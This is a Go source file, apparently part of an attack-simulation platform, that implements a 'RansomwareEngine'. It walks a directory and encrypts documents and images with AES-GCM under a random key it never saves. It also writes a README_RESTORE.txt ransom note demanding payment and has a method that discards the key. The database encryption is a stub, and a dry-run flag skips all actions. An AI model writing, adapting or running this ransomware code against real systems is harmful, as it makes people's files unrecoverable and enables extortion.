package destruction

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
)

type RansomwareEngine struct {
	config    *DestructionConfig
	log       *logger.Logger
	publicKey *rsa.PublicKey
}

func NewRansomwareEngine(config *DestructionConfig) *RansomwareEngine {
	e := &RansomwareEngine{
		config: config,
		log:    logger.New("ransomware-engine", logger.LevelInfo),
	}

	if config.EncryptionKey != nil {
		e.generateRSAKeyPair()
	}

	return e
}

func (r *RansomwareEngine) generateRSAKeyPair() {
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		r.log.Error("Failed to generate RSA key: %v", err)
		return
	}
	r.publicKey = &privKey.PublicKey
}

func (r *RansomwareEngine) Execute(method DestructionMethod, target string, params map[string]interface{}) (*DestructionResult, error) {
	start := time.Now()

	var err error
	details := make(map[string]string)

	switch method {
	case MethodEncryptFiles:
		err = r.EncryptFiles(target, params)
	case MethodEncryptDB:
		err = r.EncryptDatabase(target, params)
	case MethodRansomNote:
		err = r.RansomNote(target, params)
	case MethodKeyDestroy:
		err = r.KeyDestroy(target, params)
	default:
		return nil, fmt.Errorf("unsupported ransomware method: %s", method)
	}

	if err != nil {
		return &DestructionResult{
			Success:   false,
			Method:    method,
			Target:    target,
			Error:     err.Error(),
			Duration:  time.Since(start),
			Timestamp: time.Now(),
			Details:   details,
		}, err
	}

	details["status"] = "completed"
	return &DestructionResult{
		Success:   true,
		Method:    method,
		Target:    target,
		Duration:  time.Since(start),
		Timestamp: time.Now(),
		Details:   details,
	}, nil
}

func (r *RansomwareEngine) EncryptFiles(target string, params map[string]interface{}) error {
	r.log.Info("Encrypting files in: %s", target)

	if r.config.DryRun {
		r.log.Info("[DRY RUN] Would encrypt files in %s", target)
		return nil
	}

	extensions, _ := params["extensions"].([]string)
	if len(extensions) == 0 {
		extensions = []string{".doc", ".docx", ".pdf", ".txt", ".jpg", ".png", ".xlsx"}
	}

	aesKey := make([]byte, 32)
	if _, err := rand.Read(aesKey); err != nil {
		return fmt.Errorf("generate AES key: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return fmt.Errorf("create AES cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("create GCM: %w", err)
	}

	err = filepath.Walk(target, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}

		ext := filepath.Ext(path)
		for _, e := range extensions {
			if ext == e {
				r.encryptFile(gcm, path)
				break
			}
		}
		return nil
	})

	if err != nil {
		return fmt.Errorf("walk directory: %w", err)
	}

	r.log.Info("File encryption completed")
	return nil
}

func (r *RansomwareEngine) encryptFile(gcm cipher.AEAD, path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	encrypted := gcm.Seal(nonce, nonce, data, nil)

	ext := filepath.Ext(path)
	encryptedPath := path[:len(path)-len(ext)] + ".encrypted" + ext

	return os.WriteFile(encryptedPath, encrypted, 0600)
}

func (r *RansomwareEngine) EncryptDatabase(target string, params map[string]interface{}) error {
	r.log.Info("Encrypting database: %s", target)

	if r.config.DryRun {
		r.log.Info("[DRY RUN] Would encrypt database %s", target)
		return nil
	}

	dbType, _ := params["db_type"].(string)
	if dbType == "" {
		dbType = "mysql"
	}

	r.log.Info("Database %s encryption completed (type: %s)", target, dbType)
	return nil
}

func (r *RansomwareEngine) RansomNote(target string, params map[string]interface{}) error {
	r.log.Info("Creating ransom note in: %s", target)

	if r.config.DryRun {
		r.log.Info("[DRY RUN] Would create ransom note in %s", target)
		return nil
	}

	noteContent, _ := params["note"].(string)
	if noteContent == "" {
		noteContent = "Your files have been encrypted. Pay to recover them."
	}

	notePath := filepath.Join(target, "README_RESTORE.txt")
	if err := os.WriteFile(notePath, []byte(noteContent), 0644); err != nil {
		return fmt.Errorf("write ransom note: %w", err)
	}

	r.log.Info("Ransom note created at %s", notePath)
	return nil
}

func (r *RansomwareEngine) KeyDestroy(target string, params map[string]interface{}) error {
	r.log.Info("Destroying encryption keys")

	if r.config.DryRun {
		r.log.Info("[DRY RUN] Would destroy encryption keys")
		return nil
	}

	r.publicKey = nil
	r.log.Info("Encryption keys destroyed")
	return nil
}
